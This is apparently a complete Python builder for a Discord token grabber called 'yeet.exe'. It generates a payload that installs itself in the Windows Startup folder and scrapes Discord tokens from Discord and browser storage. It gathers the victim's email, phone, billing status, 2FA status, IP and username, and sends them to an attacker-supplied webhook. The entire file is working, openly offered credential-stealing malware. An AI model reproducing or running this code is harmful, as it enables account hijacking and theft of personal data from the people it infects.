from pystyle import Colorate, Colors, System, Center, Write, Anime


def mkdata(webhook: str, ping: bool) -> str:
    return r"""# by Krystal#6960
# https://github.com/Krysstals


from urllib.request import urlopen, Request
from urllib.error import HTTPError
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from re import findall

from json import loads, dumps
from shutil import copy



path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/yeet.pyw" % getenv("userprofile")


if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()


webhook = '""" + webhook + r"""'
pingme = """ + str(ping) + r"""


class Discord:

    def setheaders(token: str = None) -> dict:
        headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        if token:
            headers['authorization'] = token
        return headers

    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord",
            "Discord Canary": ROAMING + "\\discordcanary",
            "Discord PTB": ROAMING + "\\discordptb",
            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }

        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                try: 
                                    urlopen(Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token)))
                                except HTTPError:
                                    continue
                                if token not in found_tokens and token not in tokens:
                                    found_tokens.append(token)

            return found_tokens

        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens

class Grab:

    def token_grab(token: str):
        def getavatar(uid, aid) -> str:
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
            try:
                urlopen(Request(url, headers=Discord.setheaders()))
            except HTTPError:
                url += ".gif"
            return url

        def has_payment_methods(token) -> bool:
            has = False
            try:
                has = bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                           headers=Discord.setheaders(token))).read()))
            except:
                pass
            return has

        valid, invalid = "<a:check:816441740092899398>", ":x:"

        def verify(var):
            return valid if var else invalid

        user_data = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
                        headers=Discord.setheaders(token))).read())
        ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
        computer_username = getenv("username")
        username = user_data["username"] + \
            "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
        email = user_data.get("email")
        phone = user_data.get("phone")
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))

        nitro = valid if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)

        if not phone:
            phone = invalid

        data = [{
            "title": "Yeet.exe",
            "description": "Fish has bite!",
            "url": "https://github.com/Krysstals",
            "image": {
                "url": "https://steamuserimages-a.akamaihd.net/ugc/866241932572866825/B8C599AC2F8DA9157AF27DAB0368EF1E7B971F29/"
            },
            "color": 0x7519f6,
            "fields": [
                {
                    "name": "**Account Informations**",
                            "value": f'Email: {email}\nPhone: {phone}\nBilling: {billing}',
                            "inline": True
                },
                {
                    "name": "**PC Information**",
                            "value": f"IP: {ip}\nUser: {computer_username}",
                            "inline": True
                },
                {
                    "name": "**Additional Informations**",
                            "value": f'Nitro: {nitro}\n2FA: {mfa_enabled}',
                            "inline": False
                },
                {
                    "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                }
            ],
            "author": {
                "name": f"{username}",
                        "icon_url": avatar_url
            },

            "thumbnail": {
                "url": "https://mir-s3-cdn-cf.behance.net/project_modules/disp/61ab0b43446237.57ef7ab5be6bb.gif"
            },

            "footer": {
                "text": "yeet.exe | by Krystal#6960"
            }
        }]
        Grab.send(data)

    def send(data: str):
        data = {"username": "Yeet.exe",
                "avatar_url": "https://mir-s3-cdn-cf.behance.net/project_modules/disp/61ab0b43446237.57ef7ab5be6bb.gif",
                "embeds": data,
                "content": "@everyone" if pingme else ""}
        return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))


sent_tokens = []

def token_grab():
    for token in Discord.get_tokens():
        if token not in sent_tokens:
            Grab.token_grab(token)
        sent_tokens.append(token)


ready_data = [{
    "title": "Yeet Grabber",
    "description": "Ready To Go!",
    "url": "https://github.com/Krysstals",
    "image": {
        "url": "https://steamuserimages-a.akamaihd.net/ugc/866241932572866825/B8C599AC2F8DA9157AF27DAB0368EF1E7B971F29/"
    },
    "color": 0x7519f6,
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'Ready to find some tokens!',
            "inline": True
        }
    ],

    "thumbnail": {
        "url": "https://mir-s3-cdn-cf.behance.net/project_modules/disp/61ab0b43446237.57ef7ab5be6bb.gif"
    },

    "footer": {
        "text": "Yeet.exe | by Krystal#6960"
    }
}]

Grab.send(ready_data)


while True:
    if not isfile(__file__):
        exit()
    token_grab()
"""


purple = '''
                                        s                                              
  ..                                   :8                                              
 @L                                   .88                         uL   ..              
9888i   .dL       .u         .u      :888ooo             .u     .@88b  @88R      .u    
`Y888k:*888.   ud8888.    ud8888.  -*8888888          ud8888.  '"Y888k/"*P    ud8888.  
  888E  888I :888'8888. :888'8888.   8888           :888'8888.    Y888L     :888'8888. 
  888E  888I d888 '88%" d888 '88%"   8888           d888 '88%"     8888     d888 '88%" 
  888E  888I 8888.+"    8888.+"      8888           8888.+"        `888N    8888.+"    
  888E  888I 8888L      8888L       .8888Lu=    .   8888L       .u./"888&   8888L      
 x888N><888' '8888c. .+ '8888c. .+  ^%888*    .@8c  '8888c. .+ d888" Y888*" '8888c. .+ 
  "88"  888   "88888%    "88888%      'Y"    '%888"  "88888%   ` "Y   Y"     "88888%   
        88F     "YP'       "YP'                ^*      "YP'                    "YP'    
       98"                                                                             
     ./"                                                                               
    ~`                                          By Krystal#6960 | https://github.com/Krysstals'''[1:]


banner = r'''
         # #                   # #        
       # #     # # # # # # #     # #      
     # # # # # # # # # # # # # # # # #    
     # # # # # # # # # # # # # # # # #    
     # # # # # # # # # # # # # # # # #    
   # # # # # # # # # # # # # # # # # # #  
   # # # # # # # # # # # # # # # # # # #  
   # # # # #     # # # # #     # # # # #  
   # # # #         # # #         # # # #  
 # # # # #         # # #         # # # # #
 # # # # # #     # # # # #     # # # # # #
 # # # # # # # # # # # # # # # # # # # # #
 # # # # # # # # # # # # # # # # # # # # #
 # # # # #     # # # # # # #     # # # # #
     # # # #                   # # # #    
       # # # #               # # # #
               [press enter]'''[1:]


System.Clear()
System.Size(150, 50)
System.Title("yeet.exe")


Anime.Fade(Center.Center(banner), Colors.purple_to_red,
           Colorate.Vertical, enter=True)


def main():
    System.Clear()

    print("\n"*2)
    print(Colorate.Horizontal(Colors.purple_to_red, Center.XCenter(purple)))
    print("\n"*5)

    webhook = Write.Input("[>] Enter your webhook: ",
                          Colors.purple_to_red, interval=0.004)

    if not webhook.strip() or webhook.startswith('https://') == False:
        Colorate.Error("The WebHook is not valid.")
        return

    ping = Write.Input("[?] Would you like to get pinged when you get a hit [y/n]: ",
                       Colors.purple_to_red, interval=0.005)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Please enter either 'y' or 'n'!")
        return
    
    ping = ping == 'y'

    data = mkdata(webhook=webhook, ping=ping)
    with open("./build/yeet.pyw", 'w', encoding='utf-8') as f:
        f.write(data)

    print()
    Write.Input("Token grabber was successfully build in the 'build' folder!", Colors.purple_to_red, interval=0.005)
    return exit()


if __name__ == '__main__':
    while True:
        main()
